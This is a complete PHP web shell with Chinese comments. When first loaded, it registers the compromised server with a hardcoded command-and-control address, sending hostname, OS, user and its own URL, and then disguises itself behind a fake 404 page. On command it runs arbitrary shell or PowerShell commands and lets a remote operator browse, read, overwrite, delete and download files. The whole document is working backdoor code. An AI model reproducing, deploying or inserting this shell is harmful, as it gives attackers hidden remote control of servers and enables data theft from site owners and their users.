<?php
@error_reporting(0);
@set_time_limit(60);
header("Content-Type: application/json; charset=utf-8");

$C2 = "http://192.168.0.31:5000";
$CID = substr(md5(php_uname('a') . phpversion()), 0, 16);

function sysinfo() {
    return array(
        'hostname' => php_uname('n'),
        'os' => php_uname('s'),
        'os_version' => php_uname('r'),
        'arch' => php_uname('m'),
        'username' => @get_current_user(),
        'ip' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'unknown'
    );
}

function c2post($url, $data) {
    $ctx = stream_context_create(array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => json_encode($data),
            'timeout' => 5
        )
    ));
    return @file_get_contents($url, false, $ctx);
}

// 读取 C2 发来的操作请求（POST body）
$req = json_decode(file_get_contents('php://input'), true);

// 无请求时：自动注册 + 返回伪装页面
if (!$req || !isset($req['action'])) {
    // 向 C2 注册自己（带 webshell_url 供 C2 回连）
    $self_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http') .
        '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    c2post($C2 . "/agent/webshell/register", array(
        'client_id' => $CID,
        'webshell_url' => $self_url,
        'sysinfo' => sysinfo()
    ));
    // 返回伪装 404 页面
    header("Content-Type: text/html; charset=utf-8");
    echo "<html><head><title>System Service</title></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
    exit;
}

// 有操作请求：执行并同步返回结果（冰蝎模式）
$action = $req['action'];
$param = isset($req['param']) ? $req['param'] : array();
$result = '';
$status = 'completed';

switch ($action) {
    case 'cmd':
        $cmd = isset($param['command']) ? $param['command'] : '';
        $shell = isset($param['shell']) ? $param['shell'] : '';
        if (php_uname('s') === 'Windows NT' && $shell === 'powershell') {
            $cmd = 'powershell -Command "' . $cmd . '"';
        }
        $result = @shell_exec($cmd . ' 2>&1');
        if (!$result) $result = '(no output)';
        break;
    case 'sysinfo':
        $result = json_encode(sysinfo());
        break;
    case 'file_list':
        $path = isset($param['path']) ? $param['path'] : '.';
        $files = array();
        if (is_dir($path)) {
            foreach (scandir($path) as $f) {
                if ($f === '.' || $f === '..') continue;
                $fp = $path . DIRECTORY_SEPARATOR . $f;
                $files[] = array(
                    'name' => $f,
                    'is_dir' => is_dir($fp),
                    'size' => is_file($fp) ? filesize($fp) : 0,
                    'mtime' => date('Y-m-d H:i', @filemtime($fp))
                );
            }
        }
        $result = json_encode(array('path' => realpath($path) ?: $path, 'items' => $files));
        break;
    case 'file_view':
        $fp = isset($param['path']) ? $param['path'] : '';
        $content = @file_get_contents($fp);
        $result = json_encode(array('path' => $fp, 'content' => $content, 'size' => @filesize($fp), 'encoding' => 'utf-8'));
        break;
    case 'file_delete':
        $p = isset($param['path']) ? $param['path'] : '';
        $ok = is_dir($p) ? @rmdir($p) : @unlink($p);
        $result = $ok ? 'OK' : '[ERROR] delete failed';
        break;
    case 'file_mkdir':
        $p = isset($param['path']) ? $param['path'] : '';
        $result = @mkdir($p, 0755, true) ? 'OK' : '[ERROR] mkdir failed';
        break;
    case 'file_rename':
        $old = isset($param['old_path']) ? $param['old_path'] : '';
        $new = isset($param['new_path']) ? $param['new_path'] : '';
        $result = @rename($old, $new) ? 'OK' : '[ERROR] rename failed';
        break;
    case 'file_save':
        $fp = isset($param['path']) ? $param['path'] : '';
        $content = isset($param['content']) ? $param['content'] : '';
        $result = @file_put_contents($fp, $content) !== false ? json_encode(array('path' => $fp, 'size' => strlen($content))) : '[ERROR] save failed';
        break;
    case 'file_download':
        $fp = isset($param['path']) ? $param['path'] : '';
        $data = @file_get_contents($fp);
        if ($data !== false) {
            $result = json_encode(array('filename' => basename($fp), 'data' => base64_encode($data)));
        } else {
            $result = '[ERROR] file not found';
        }
        break;
    default:
        $result = '[ERROR] Unsupported action: ' . $action;
        $status = 'failed';
}

echo json_encode(array('status' => $status, 'result' => $result));
?>